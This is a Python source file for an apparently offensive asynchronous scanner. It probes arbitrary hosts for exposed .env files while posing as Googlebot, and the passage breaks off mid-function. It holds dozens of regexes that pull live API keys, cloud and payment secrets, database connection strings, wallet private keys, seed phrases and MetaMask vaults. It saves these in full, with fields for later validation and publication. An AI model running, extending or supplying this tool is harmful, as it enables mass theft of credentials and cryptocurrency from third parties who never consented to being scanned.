"""
env_scanner.py — high-performance async scanner for exposed .env files.

Key design choices:
  - asyncio.Queue worker pool (no batch blocking)
  - TCP pre-check per host: skip dead hosts immediately
  - Per-mode abort on first TCP failure (no wasted path checks)
  - Paths checked concurrently within each host (path semaphore)
  - Status updated every 2 seconds via background task
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import secrets
import signal
import socket
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import unquote as _url_unquote

import aiohttp

from env_paths import (
    ENV_PATHS as _BASE_ENV_PATHS,
    FAST_ENV_PATHS as _FAST_ENV_PATHS,
    should_scan_content,
    is_env_formatted,
    path_looks_like_env,
)
import dns_resolvers as _dns_resolvers

ROOT         = Path(__file__).resolve().parent
DATA_DIR     = ROOT / "data"

# Load custom paths override if it exists (set via Config UI)
_CUSTOM_PATHS_FILE = DATA_DIR / "custom_paths_override.json"
try:
    if _CUSTOM_PATHS_FILE.exists():
        with open(_CUSTOM_PATHS_FILE) as _f:
            ENV_PATHS: list[str] = json.load(_f)
    else:
        # Default: fast mode (20 paths). Set ENV_SCAN_FULL=1 for all 1745 paths.
        ENV_PATHS = _FAST_ENV_PATHS
except Exception:
    ENV_PATHS = _FAST_ENV_PATHS

ENV_FOUND    = DATA_DIR / "env_found.jsonl"
KEYS_FILE    = DATA_DIR / "found_keys.jsonl"
STATUS_FILE  = DATA_DIR / "env_scan_status.json"
STOP_FILE    = DATA_DIR / "env_scan_stop"
INPUT_FILE   = DATA_DIR / "env_scan_input.txt"
OFFSET_FILE  = DATA_DIR / "env_scan_input.txt.offset"
HISTORY_FILE = DATA_DIR / "env_scan_history.jsonl"

# Module-level run state captured during main(); used by __main__'s finally
# block so a history record is written even if the scan is interrupted (e.g.
# stuck DNS init then SIGTERM, KeyboardInterrupt, or unexpected exception).
_run_state: dict = {}

# ── Key extraction ────────────────────────────────────────────────────────────

# (service, category, pattern)
PATTERNS: list[tuple[str, str, re.Pattern[str]]] = [
    # ── AI ────────────────────────────────────────────────────────────────────
    ("openai",       "ai", re.compile(r'(?<![A-Za-z0-9_])(sk-proj-[A-Za-z0-9_-]{20,200})(?![A-Za-z0-9_-])')),
    ("openai",       "ai", re.compile(r'(?<![A-Za-z0-9_])(sk-[A-Za-z0-9]{48})(?![A-Za-z0-9])')),
    ("anthropic",    "ai", re.compile(r'(?<![A-Za-z0-9_])(sk-ant-api03-[A-Za-z0-9_-]{85,200})(?![A-Za-z0-9_-])')),
    ("openrouter",   "ai", re.compile(r'(?<![A-Za-z0-9_])(sk-or-v1-[A-Za-z0-9_-]{60,200})(?![A-Za-z0-9_-])')),
    ("google",       "ai", re.compile(r'(?<![A-Za-z0-9_])(AIza[A-Za-z0-9_-]{35})(?![A-Za-z0-9_-])')),
    ("huggingface",  "ai", re.compile(r'(?<![A-Za-z0-9_])(hf_[A-Za-z0-9]{34,100})(?![A-Za-z0-9])')),
    ("groq",         "ai", re.compile(r'(?<![A-Za-z0-9_])(gsk_[A-Za-z0-9]{52})(?![A-Za-z0-9])')),
    ("replicate",    "ai", re.compile(r'(?<![A-Za-z0-9_])(r8_[A-Za-z0-9]{37})(?![A-Za-z0-9])')),
    ("perplexity",   "ai", re.compile(r'(?<![A-Za-z0-9_])(pplx-[A-Za-z0-9]{48})(?![A-Za-z0-9])')),
    ("cohere",       "ai", re.compile(r'(?<![A-Za-z0-9_])(CO\.[A-Za-z0-9_-]{38,100})(?![A-Za-z0-9_-])')),
    ("deepseek",     "ai", re.compile(r'(?<![A-Za-z0-9_])(sk-[a-f0-9]{32})(?![A-Za-z0-9])')),
    ("mistral",      "ai", re.compile(r'(?<![A-Za-z0-9_])(msk-[A-Za-z0-9]{32,80})(?![A-Za-z0-9_-])')),
    ("xai",          "ai", re.compile(r'(?<![A-Za-z0-9_])(xai-[A-Za-z0-9_-]{40,120})(?![A-Za-z0-9_-])')),
    # ── AI extended (per user provider list) ──────────────────────────────────
    ("together",     "ai", re.compile(r'(?<![A-Za-z0-9_])(tgp_v1_[A-Za-z0-9_-]{40,200})(?![A-Za-z0-9_-])')),
    ("fireworks",    "ai", re.compile(r'(?<![A-Za-z0-9_])(fw_[A-Za-z0-9]{20,60})(?![A-Za-z0-9_-])')),
    ("nvidia",       "ai", re.compile(r'(?<![A-Za-z0-9_])(nvapi-[A-Za-z0-9_-]{60,200})(?![A-Za-z0-9_-])')),
    ("cerebras",     "ai", re.compile(r'(?<![A-Za-z0-9_])(csk-[A-Za-z0-9]{40,80})(?![A-Za-z0-9_-])')),
    ("tavily",       "ai", re.compile(r'(?<![A-Za-z0-9_])(tvly-[A-Za-z0-9]{32,80})(?![A-Za-z0-9_-])')),
    ("langsmith",    "ai", re.compile(r'(?<![A-Za-z0-9_])(lsv2_(?:pt|sk)_[a-f0-9]{32}_[a-f0-9]{10})(?![A-Za-z0-9_-])')),
    ("anyscale",     "ai", re.compile(r'(?<![A-Za-z0-9_])(esecret_[A-Za-z0-9]{30,80})(?![A-Za-z0-9_-])')),
    ("helicone",     "ai", re.compile(r'(?<![A-Za-z0-9_])(sk-helicone-[A-Za-z0-9-]{40,80})(?![A-Za-z0-9_-])')),
    ("modal",        "ai", re.compile(r'(?<![A-Za-z0-9_])(modal-(?:prod|dev|main)-[a-z0-9-]{30,80})(?![A-Za-z0-9_-])')),
    ("mapbox",       "ai", re.compile(r'(?<![A-Za-z0-9_])(pk\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})(?![A-Za-z0-9_-])')),
    ("vercel",       "ai", re.compile(r'(?<![A-Za-z0-9_])(v0_[A-Za-z0-9]{32,80})(?![A-Za-z0-9_-])')),
    # ── Chinese AI providers ───────────────────────────────────────────────────
    ("moonshot",     "ai", re.compile(r'(?:MOONSHOT_API_KEY|KIMI_API_KEY|kimi[_\s-]?api[_\s-]?key|moonshot[_\s-]?api[_\s-]?key)["\']?\s*[:=]\s*["\']?(sk-[A-Za-z0-9]{32,96})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("dashscope",    "ai", re.compile(r'(?:DASHSCOPE_API_KEY|QWEN_API_KEY|qwen[_\s-]?api[_\s-]?key|dashscope[_\s-]?api[_\s-]?key|ALIBABA_API_KEY)["\']?\s*[:=]\s*["\']?(sk-[A-Za-z0-9]{32,96})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("minimax",      "ai", re.compile(r'(?:MINIMAX_API_KEY|minimax[_\s-]?api[_\s-]?key)["\']?\s*[:=]\s*["\']?([A-Za-z0-9._-]{32,200})(?![A-Za-z0-9._-])', re.IGNORECASE)),
    ("zhipuai",      "ai", re.compile(r'(?:ZHIPUAI_API_KEY|ZHIPU_API_KEY|GLM_API_KEY|zhipuai[_\s-]?api[_\s-]?key|zhipu[_\s-]?api[_\s-]?key)["\']?\s*[:=]\s*["\']?([A-Za-z0-9._-]{20,200})(?![A-Za-z0-9._-])', re.IGNORECASE)),
    ("zhipuai",      "ai", re.compile(r'(?<![A-Za-z0-9_])([a-f0-9]{16}\.[A-Za-z0-9]{32,48})(?![A-Za-z0-9.])')),
    # ── Infra / DevOps (per user "more useful things to pull") ────────────────
    ("sentry_dsn",   "infra", re.compile(r'(https://[a-f0-9]{32}@(?:o\d+\.ingest\.(?:us\.|de\.)?)?sentry\.io/\d+)')),
    ("heroku",       "infra", re.compile(r'(?<![A-Za-z0-9_])(HRKU-[A-Za-z0-9_-]{36,60})(?![A-Za-z0-9_-])')),
    ("newrelic_admin","infra", re.compile(r'(?<![A-Za-z0-9_])(NRAK-[A-Z0-9]{27})(?![A-Za-z0-9_-])')),
    ("newrelic_insert","infra", re.compile(r'(?<![A-Za-z0-9_])(NRII-[A-Za-z0-9]{32})(?![A-Za-z0-9_-])')),
    ("supabase",     "infra", re.compile(r'(?<![A-Za-z0-9_])(sbp_[a-f0-9]{40})(?![A-Za-z0-9_-])')),
    ("cloudinary",   "infra", re.compile(r'(cloudinary://\d{12,}:[A-Za-z0-9_-]{20,}@[a-z0-9-]+)')),
    ("datadog",      "infra", re.compile(r'(?:DATADOG_API_KEY|DD_API_KEY|datadog[_\s-]?api[_\s-]?key)["\']?\s*[:=]\s*["\']?([a-f0-9]{32})(?![a-f0-9])', re.IGNORECASE)),
    ("pinecone",     "ai", re.compile(r'(?:PINECONE_API_KEY|pinecone[_\s-]?api[_\s-]?key)["\']?\s*[:=]\s*["\']?([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})(?![a-f0-9])', re.IGNORECASE)),
    ("elevenlabs",   "ai", re.compile(r'(?:ELEVEN(?:LABS)?_API_KEY|elevenlabs[_\s-]?api[_\s-]?key)["\']?\s*[:=]\s*["\']?([a-f0-9]{32})(?![a-f0-9])', re.IGNORECASE)),
    # ── Payments ──────────────────────────────────────────────────────────────
    ("stripe",       "payments", re.compile(r'(?<![A-Za-z0-9_])(sk_live_[A-Za-z0-9]{20,200})(?![A-Za-z0-9_-])')),
    ("stripe",       "payments", re.compile(r'(?<![A-Za-z0-9_])(sk_test_[A-Za-z0-9]{20,200})(?![A-Za-z0-9_-])')),
    ("stripe",       "payments", re.compile(r'(?<![A-Za-z0-9_])(rk_live_[A-Za-z0-9]{20,200})(?![A-Za-z0-9_-])')),
    ("stripe",       "payments", re.compile(r'(?<![A-Za-z0-9_])(rk_test_[A-Za-z0-9]{20,200})(?![A-Za-z0-9_-])')),
    # ── Email ─────────────────────────────────────────────────────────────────
    ("sendgrid",     "email", re.compile(r'(?<![A-Za-z0-9_.])(SG\.[A-Za-z0-9_-]{22,}\.[A-Za-z0-9_-]{43,})(?![A-Za-z0-9_-])')),
    ("mailgun",      "email", re.compile(r'(?<![A-Za-z0-9_])(key-[a-f0-9]{32})(?![A-Za-z0-9_-])')),
    ("resend",       "email", re.compile(r'(?<![A-Za-z0-9_])(re_[A-Za-z0-9_-]{30,64})(?![A-Za-z0-9_-])')),
    ("postmark",     "email", re.compile(r'(?<![A-Za-z0-9_])(POSTMARK_[A-Za-z0-9_-]{36,50})(?![A-Za-z0-9_-])')),
    # ── Cloud ─────────────────────────────────────────────────────────────────
    ("aws",          "cloud", re.compile(r'(?<![A-Za-z0-9])(AKIA[A-Z0-9]{16})(?![A-Za-z0-9])')),
    # AWS-compatible secret keys: S3/MinIO/Spaces/Backblaze/Wasabi etc.
    # Pattern: env var name containing SECRET_KEY + 40-char base64 value
    ("aws",          "cloud", re.compile(
        r'(?:AWS_SECRET_ACCESS_KEY|S3_SECRET(?:_ACCESS)?_KEY|BUCKET_SECRET(?:_ACCESS)?_KEY|'
        r'MINIO_SECRET(?:_ACCESS)?_KEY|SPACES_SECRET(?:_ACCESS)?_KEY|DO_SPACES_SECRET|'
        r'WASABI_SECRET(?:_ACCESS)?_KEY|B2_APPLICATION_KEY_ID|BACKBLAZE_SECRET_KEY|'
        r'LINODE_OBJECT_STORAGE_SECRET_KEY|SCALEWAY_SECRET_KEY|EXOSCALE_API_SECRET|'
        r'VULTR_OBJECT_SECRET|OCI_SECRET_KEY|CLOUDIAN_SECRET_KEY|R2_SECRET_ACCESS_KEY|'
        r'CF_R2_SECRET|STORJ_SECRET_KEY)["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+]{38,44})["\']?',
        re.IGNORECASE
    )),
    ("digitalocean", "cloud", re.compile(r'(?<![A-Za-z0-9_])(dop_v1_[a-f0-9]{64})(?![A-Za-z0-9_-])')),
    ("cloudflare",   "cloud", re.compile(r'(?<![A-Za-z0-9_])(cf_[A-Za-z0-9_-]{37,50})(?![A-Za-z0-9_-])')),
    # ── Auth / Tokens ─────────────────────────────────────────────────────────
    ("github",       "auth", re.compile(r'(?<![A-Za-z0-9_])(ghp_[A-Za-z0-9]{32,})(?![A-Za-z0-9])')),
    ("github",       "auth", re.compile(r'(?<![A-Za-z0-9_])(gho_[A-Za-z0-9]{32,})(?![A-Za-z0-9])')),
    ("github",       "auth", re.compile(r'(?<![A-Za-z0-9_])(ghs_[A-Za-z0-9]{32,})(?![A-Za-z0-9])')),
    ("github",       "auth", re.compile(r'(?<![A-Za-z0-9_])(github_pat_[A-Za-z0-9_]{60,})(?![A-Za-z0-9_])')),
    ("gitlab",       "auth", re.compile(r'(?<![A-Za-z0-9_])(glpat-[A-Za-z0-9_-]{18,})(?![A-Za-z0-9_-])')),
    ("jwt",          "auth", re.compile(r'(?<![A-Za-z0-9_/])(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})(?![A-Za-z0-9_-])')),
    # ── Messaging ─────────────────────────────────────────────────────────────
    ("telegram",     "messaging", re.compile(r'(?<![A-Za-z0-9])([\d]{8,10}:AA[A-Za-z0-9_-]{28,})(?![A-Za-z0-9_-])')),
    ("twilio",       "messaging", re.compile(r'(?<![A-Za-z0-9])(SK[a-f0-9]{32})(?![A-Za-z0-9])')),
    ("slack_webhook","messaging", re.compile(r'(https://hooks\.slack\.com/services/T[A-Za-z0-9_-]+/B[A-Za-z0-9_-]+/[A-Za-z0-9_-]{24,})')),
    ("discord_webhook","messaging", re.compile(r'(https://discord(?:app)?\.com/api/webhooks/\d{17,19}/[A-Za-z0-9_-]{60,})')),
    # ── Storage ───────────────────────────────────────────────────────────────
    ("backblaze",    "storage", re.compile(r'(?<![A-Za-z0-9_])(K[0-9]{3}[A-Za-z0-9]{28,})(?![A-Za-z0-9])')),
    # ── Database connection strings ───────────────────────────────────────────
    ("postgresql",   "database", re.compile(r'(postgres(?:ql)?://[^:\s"\']{1,64}:[^@\s"\']{4,64}@[^\s"\'/@]{1,128}/\w+)')),
    ("mysql",        "database", re.compile(r'(mysql(?:2)?://[^:\s"\']{1,64}:[^@\s"\']{4,64}@[^\s"\'/@]{1,128}/\w+)')),
    ("mongodb",      "database", re.compile(r'(mongodb(?:\+srv)?://[^:\s"\']{1,64}:[^@\s"\']{4,64}@[^\s"\']{4,200})')),
    ("redis",        "database", re.compile(r'(redis(?:s)?://:[^@\s"\']{6,}@[^\s"\']+)')),
    # ── Payments (extended) ───────────────────────────────────────────────────
    ("paypal",       "payments", re.compile(r'(?<![A-Za-z0-9_])(access_token\$(?:production|sandbox)\$[A-Za-z0-9._-]{60,300})(?![A-Za-z0-9_])')),
    ("square",       "payments", re.compile(r'(?<![A-Za-z0-9_])(EAAAE[A-Za-z0-9_-]{50,200})(?![A-Za-z0-9_-])')),
    ("square",       "payments", re.compile(r'(?<![A-Za-z0-9_])(sq0[a-z]{3}-[A-Za-z0-9_-]{22,50})(?![A-Za-z0-9_-])')),
    ("shopify",      "payments", re.compile(r'(?<![A-Za-z0-9_])(shp(?:at|ss|ca)_[A-Za-z0-9]{32,})(?![A-Za-z0-9_])')),
    ("paddle",       "payments", re.compile(r'(?<![A-Za-z0-9_])(pdl_[a-z]{2}_[A-Za-z0-9_-]{60,200})(?![A-Za-z0-9_-])')),
    # ── Crypto / Wallets ──────────────────────────────────────────────────────
    ("ethereum",     "crypto", re.compile(r'(?:private[_\s-]?key|priv[_\s-]?key|eth[_\s-]?key|wallet[_\s-]?key|secret[_\s-]?key|PRIVATE_KEY|PRIV_KEY|WALLET_PRIVATE_KEY)["\']?\s*[:=]\s*["\']?(0x[a-fA-F0-9]{64})(?![a-fA-F0-9])', re.IGNORECASE)),
    ("bitcoin",      "crypto", re.compile(r'(?:btc|bitcoin|wif)[_\s-]?(?:private[_\s-]?key|priv|secret|wif)["\']?\s*[:=]\s*["\']?([5KL][1-9A-HJ-NP-Za-km-z]{50,51})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("solana",       "crypto", re.compile(r'(?:solana|sol|phantom)[_\s-]?(?:private[_\s-]?key|secret[_\s-]?key|secret)["\']?\s*[:=]\s*["\']?([1-9A-HJ-NP-Za-km-z]{87,88})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("bip39_seed",   "crypto", re.compile(r'(?:mnemonic|seed[_\s-]?phrase|seedphrase|recovery[_\s-]?phrase|wallet[_\s-]?seed|backup[_\s-]?phrase|MNEMONIC|SEED_PHRASE)["\']?\s*[:=]\s*["\']?((?:\b[a-z]{3,8}\b[\s\u00A0]+){11,23}\b[a-z]{3,8}\b)', re.IGNORECASE)),
    ("binance",      "crypto", re.compile(r'(?:BINANCE_API_KEY|BINANCE_SECRET_KEY|binance[_\s-]?api[_\s-]?(?:key|secret))["\']?\s*[:=]\s*["\']?([A-Za-z0-9]{64})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("coinbase",     "crypto", re.compile(r'(?:COINBASE_API_KEY|coinbase[_\s-]?api[_\s-]?(?:key|secret))["\']?\s*[:=]\s*["\']?([A-Za-z0-9]{32,128})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("tron",         "crypto", re.compile(r'(?:TRON_PRIVATE_KEY|tron[_\s-]?private[_\s-]?key)["\']?\s*[:=]\s*["\']?([A-Fa-f0-9]{64})(?![A-Fa-f0-9])', re.IGNORECASE)),
    ("kraken",       "crypto", re.compile(r'(?:KRAKEN_API_KEY|KRAKEN_PRIVATE_KEY|kraken[_\s-]?api[_\s-]?(?:key|secret))["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/=]{56,128})(?![A-Za-z0-9+/=])', re.IGNORECASE)),
    ("bybit",        "crypto", re.compile(r'(?:BYBIT_API_KEY|BYBIT_SECRET(?:_KEY)?|bybit[_\s-]?api[_\s-]?(?:key|secret))["\']?\s*[:=]\s*["\']?([A-Za-z0-9]{18,40})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("okx",          "crypto", re.compile(r'(?:OKX_API_KEY|OKX_SECRET(?:_KEY)?|OKX_PASSPHRASE|okx[_\s-]?api[_\s-]?(?:key|secret|passphrase))["\']?\s*[:=]\s*["\']?([A-Za-z0-9-]{20,80})(?![A-Za-z0-9-])', re.IGNORECASE)),
    ("kucoin",       "crypto", re.compile(r'(?:KUCOIN_API_KEY|KUCOIN_SECRET(?:_KEY)?|KUCOIN_PASSPHRASE|kucoin[_\s-]?api[_\s-]?(?:key|secret|passphrase))["\']?\s*[:=]\s*["\']?([A-Za-z0-9-]{20,80})(?![A-Za-z0-9-])', re.IGNORECASE)),
    ("bitget",       "crypto", re.compile(r'(?:BITGET_API_KEY|BITGET_SECRET(?:_KEY)?|BITGET_PASSPHRASE|bitget[_\s-]?api[_\s-]?(?:key|secret|passphrase))["\']?\s*[:=]\s*["\']?([A-Za-z0-9]{30,80})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("mexc",         "crypto", re.compile(r'(?:MEXC_API_KEY|MEXC_SECRET(?:_KEY)?|mexc[_\s-]?api[_\s-]?(?:key|secret))["\']?\s*[:=]\s*["\']?([A-Za-z0-9]{30,80})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("huobi",        "crypto", re.compile(r'(?:HUOBI_API_KEY|HUOBI_SECRET(?:_KEY)?|HTX_API_KEY|HTX_SECRET(?:_KEY)?|huobi[_\s-]?api[_\s-]?(?:key|secret)|htx[_\s-]?api[_\s-]?(?:key|secret))["\']?\s*[:=]\s*["\']?([A-Za-z0-9-]{30,80})(?![A-Za-z0-9-])', re.IGNORECASE)),
    ("gateio",       "crypto", re.compile(r'(?:GATE_API_KEY|GATEIO_API_KEY|GATE_SECRET(?:_KEY)?|GATEIO_SECRET(?:_KEY)?|gate[_\s-]?api[_\s-]?(?:key|secret))["\']?\s*[:=]\s*["\']?([A-Za-z0-9]{30,80})(?![A-Za-z0-9])', re.IGNORECASE)),
    ("solana_array", "crypto", re.compile(r'(?:SOLANA_PRIVATE_KEY|SOL_PRIVATE_KEY|phantom[_\s-]?secret|phantom[_\s-]?private[_\s-]?key)["\']?\s*[:=]\s*\[((?:\s*\d{1,3}\s*,){63}\s*\d{1,3}\s*)\]', re.IGNORECASE)),
    ("ton_wallet",   "crypto", re.compile(r'(?:TON_MNEMONIC|TON_SEED|ton[_\s-]?(?:mnemonic|seed|secret[_\s-]?key))["\']?\s*[:=]\s*["\']?((?:\b[a-z]{3,8}\b[\s\u00A0]+){23}\b[a-z]{3,8}\b)', re.IGNORECASE)),
    ("metamask_vault","crypto", re.compile(r'\{"data":"[A-Za-z0-9+/=]{200,1000}","iv":"[A-Za-z0-9+/=]{20,40}","salt":"[A-Za-z0-9+/=]{20,60}"\}')),
]

_PLACEHOLDER = re.compile(
    r'(?<![A-Za-z0-9])(xxxx+|your[_-]?key|api[_-]?key|insert[_-]?here|replace[_-]?me|placeholder|dummy[_-]?key|changeme|your[_-]?secret)(?![A-Za-z0-9])'
    r'|<[^>]{2,50}>'
    r'|\.{3,}'
    r'|\*{4,}',
    re.IGNORECASE,
)

def _now() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()

def _mask(key: str) -> str:
    if key.startswith("http"):
        return key[:30] + "..." + key[-8:]
    return key[:8] + "..." + key[-4:] if len(key) > 12 else key[:4] + "..."

def _fp(s: str) -> str:
    import hashlib
    return hashlib.sha256(s.encode()).hexdigest()[:24]

def extract_keys(text: str, url: str, host: str) -> list[dict]:
    found, seen = [], set()
    for svc, cat, pat in PATTERNS:
        for m in pat.finditer(text):
            k = m.group(1)
            if k in seen or _PLACEHOLDER.search(k) or len(set(k)) < 5:
                continue
            seen.add(k)
            fp = _fp(f"key|{k}")
            ctx = text[max(0, m.start()-200):m.end()+200].strip()
            found.append({"id": fp, "type": "key", "key": k, "key_masked": _mask(k),
                          "service": svc, "category": cat, "source": "ENV Scanner",
                          "query": host, "url": url, "title": f"Exposed .env on {host}",
                          "snippet": ctx, "status": "unchecked",
                          "validated_at": None, "published_at": None,
                          "first_seen_at": _now(), "fingerprint": fp})
    return found


# ── TCP pre-check ──────────────────────────────────────────────────────────────

async def tcp_ok(ip: str, port: int, timeout: float) -> bool:
    """Fast TCP connect check. Returns True if port accepts connections."""
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
        w.close()
        try: await w.wait_closed()
        except Exception: pass
        return True
    except Exception:
        return False


# ── Reverse DNS ───────────────────────────────────────────────────────────────

# Module-level pool — initialized once in main() before workers start
_dns_pool: _dns_resolvers.ResolverPool | None = None

async def rdns(ip: str) -> str | None:
    """Reverse DNS via distributed pool, falls back to system resolver."""
    if _dns_pool is not None and _dns_pool.ready:
        return await _dns_pool.rdns(ip)
    # Fallback: system resolver
    loop = asyncio.get_event_loop()
    try:
        res = await asyncio.wait_for(
            loop.run_in_executor(None, lambda: socket.gethostbyaddr(ip)), timeout=2.0)
        h = res[0]
        return h if h and h != ip else None
    except Exception:
        return None


# ── HTTP fetch ────────────────────────────────────────────────────────────────

_UA = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

async def fetch(
    session: aiohttp.ClientSession,
    scheme: str, addr: str, path: str,
    host_hdr: str | None, timeout: int,
) -> tuple[int, str]:
    url = f"{scheme}://{addr}/{path.lstrip('/')}"
    # Keep-alive enabled (no Connection: close) so aiohttp pools TCP+TLS
    # connections per host across all path checks. For deep mode (1745 paths
    # to the same host) this avoids 1744 redundant TLS handshakes.
    hdrs = {"User-Agent": _UA, "Accept": "*/*"}
    if host_hdr:
        hdrs["Host"] = host_hdr
    try:
        async with session.get(url, headers=hdrs,
                               timeout=aiohttp.ClientTimeout(total=timeout),
                               allow_redirects=False, ssl=False) as r:
            if r.status != 200:
                return r.status, ""
            body = await r.content.read(512_000)
            return 200, body.decode("utf-8", errors="replace")
    except Exception:
        return -1, ""


# ── Pre-compute canonical path groups (URL-encoded dedup) ─────────────────────
# canonical key = unquoted path, lowercased, stripped of leading slash
# Once a canonical key is confirmed 200, skip all URL-encoded variants.

def _canonical(path: str) -> str:
    return _url_unquote(path).lstrip("/").lower()

def _sorted_paths(paths: list[str]) -> list[str]:
    """Return paths sorted: plain (no %) first, URL-encoded last.
    Within each group preserve original order so most-likely paths come first."""
    plain   = [p for p in paths if "%" not in p]
    encoded = [p for p in paths if "%" in p]
    return plain + encoded


# ── Per-host scan ─────────────────────────────────────────────────────────────

async def scan_host(
    session: aiohttp.ClientSession,
    host_input: str,
    paths: list[str],
    timeout: int,
    max_fail: int,
    path_sem: asyncio.Semaphore,
) -> list[dict]:
    results: list[dict] = []

    # ── parse host:port (preserves discovered ports like 8080/8443) ──
    # IPv6 handling: bracketed form "[::1]:8080" is split correctly by rpartition;
    # bare IPv6 ("2001:db8::1") has multiple colons and would be mis-parsed —
    # detect that case and treat the whole string as a host with no explicit port.
    explicit_port: int | None = None
    is_bracketed_ipv6 = host_input.startswith("[") and "]" in host_input
    bare_ipv6 = (not is_bracketed_ipv6) and host_input.count(":") >= 2
    if ":" in host_input and not bare_ipv6:
        h, _, p = host_input.rpartition(":")
        # rpartition on "[::1]:8080" yields ("[::1]", ":", "8080") — both digits
        if p.isdigit() and 1 <= int(p) <= 65535:
            host = h
            explicit_port = int(p)
        else:
            host = host_input
    else:
        host = host_input

    # ── determine IP vs hostname ──
    is_ip = True
    try:
        socket.inet_aton(host)
    except socket.error:
        is_ip = False

    # ── TCP pre-check ──
    tcp_timeout = min(timeout * 0.4, 1.0)
    if explicit_port is not None:
        # Only probe the discovered port; pick http vs https by convention
        ok = await tcp_ok(host, explicit_port, tcp_timeout)
        if not ok:
            return results
        is_https_port = explicit_port in (443, 8443) or explicit_port >= 8000 and explicit_port % 100 == 43
        has_https = is_https_port
        has_http  = not is_https_port
    else:
        has_http, has_https = await asyncio.gather(
            tcp_ok(host, 80,  tcp_timeout),
            tcp_ok(host, 443, tcp_timeout),
        )
        if not has_http and not has_https:
            return results   # dead host — skip all paths

    # ── reverse DNS for https-dns mode (parallel with TCP — non-blocking) ──
    # Start rDNS as a side task so it overlaps with the TCP probe above.
    # If it doesn't finish in time before path scanning starts, we just skip
    # https-dns mode for this host (it's purely additive).
    dns_host: str | None = None
    rdns_task: asyncio.Task | None = None
    if is_ip and _dns_pool is not None and _dns_pool.ready and _dns_pool.size >= 3:
        rdns_task = asyncio.create_task(rdns(host))

    # ── define modes to run based on TCP results ──
    # If explicit port given, embed it into the host so URLs are correct.
    netloc = f"{host}:{explicit_port}" if explicit_port is not None else host
    MODES = []
    if has_https:
        MODES.append(("https", "https", None, netloc))
    if has_http:
        MODES.append(("http", "http", None, netloc))

    # Now that TCP is done, give rDNS a brief chance to finish (it usually
    # already has, since TCP took similar time). Cap wait at 1.5s — more than
    # that and the per-host overhead defeats the purpose.
    if rdns_task is not None:
        try:
            dns_host = await asyncio.wait_for(asyncio.shield(rdns_task), timeout=1.5)
        except asyncio.TimeoutError:
            dns_host = None
            # rdns_task is still running thanks to shield(); attach a
            # done-callback to consume any future exception so asyncio
            # doesn't log "Task exception was never retrieved".
            rdns_task.add_done_callback(lambda t: t.exception())
        except Exception:
            dns_host = None
    if has_https and dns_host and dns_host != host:
        dns_netloc = f"{dns_host}:{explicit_port}" if explicit_port is not None else dns_host
        MODES.append(("https-dns", "https", dns_host, dns_netloc))

    if not MODES:
        return results

    # ── sorted paths: plain first (canonical discovered before encoded variants) ──
    ordered_paths = _sorted_paths(paths)

    # Canonical → first matching path that returned 200 (for dedup across modes)
    found_canonicals: set[str] = set()

    async def check_path(scheme: str, addr: str, path: str,
                         host_hdr: str | None) -> tuple[int, str]:
        async with path_sem:
            return await fetch(session, scheme, addr, path, host_hdr, timeout)

    for mode_name, scheme, host_hdr, addr in MODES:
        if STOP_FILE.exists():
            break

        # Skip URL-encoded paths whose canonical was already found 200
        # (plain paths always run; encoded paths skipped if canonical confirmed)
        paths_to_run = [
            p for p in ordered_paths
            if "%" not in p or _canonical(p) not in found_canonicals
        ]

        if not paths_to_run:
            break

        # ── Run paths in batches (fewer sequential awaits, less overhead) ──
        # Tier-1 batch is smaller (150) so deep mode can abort hostile hosts
        # after only ~150 probes instead of waiting 300. Subsequent batches
        # use 300 (more efficient when host is known to be alive).
        # Single-gather of all 1745 coroutines overloads the event loop.
        deep_mode = len(paths_to_run) > 200
        TIER1 = 150 if deep_mode else len(paths_to_run)
        BATCH_REST = 300

        mode_results: list[dict] = []
        conn_errors = 0
        non_200_codes: dict[int, int] = {}
        i = 0
        while i < len(paths_to_run):
            if STOP_FILE.exists():
                break
            batch_size = TIER1 if i == 0 else BATCH_REST
            batch = paths_to_run[i:i + batch_size]
            responses = await asyncio.gather(
                *[check_path(scheme, addr, p, host_hdr) for p in batch],
                return_exceptions=True,
            )
            for path, resp in zip(batch, responses):
                if isinstance(resp, Exception):
                    conn_errors += 1
                    continue
                status, content = resp
                if status >= 0 and status != 200:
                    non_200_codes[status] = non_200_codes.get(status, 0) + 1
                if status == 200 and content and should_scan_content(content):
                    can = _canonical(path)
                    found_canonicals.add(can)
                    url = f"{scheme}://{addr}/{path.lstrip('/')}"
                    keys = extract_keys(content, url, host)
                    key_cats = list(dict.fromkeys(
                        k["category"] for k in keys if k.get("category")
                    ))
                    key_svcs = list(dict.fromkeys(
                        k["service"] for k in keys if k.get("service")
                    ))
                    # Decide whether to record this find:
                    #   1) extracted ≥1 key            → always record
                    #   2) body is shell-style env     → record (real .env
                    #                                     with placeholders,
                    #                                     DSN passwords)
                    #   else                           → skip
                    #
                    # NOTE: env-shaped URL alone is NOT enough. Many servers
                    # return 200 OK on /.env or /#.env# with junk bodies
                    # like "<h1>OK</h1>" or default nginx log lines. Only
                    # the BODY shape proves it's a real config.
                    if not keys and not is_env_formatted(content):
                        continue
                    mode_results.append({
                        "host": host, "mode": mode_name, "path": path,
                        "url": url, "status": "found",
                        "content_preview": content[:1000],
                        "content_length": len(content),
                        "keys_found": len(keys),
                        "key_categories": key_cats,
                        "key_services": key_svcs,
                        "found_at": _now(),
                        "keys": keys,
                        "_content_hash": hash(content[:256]),
                    })
            i += batch_size

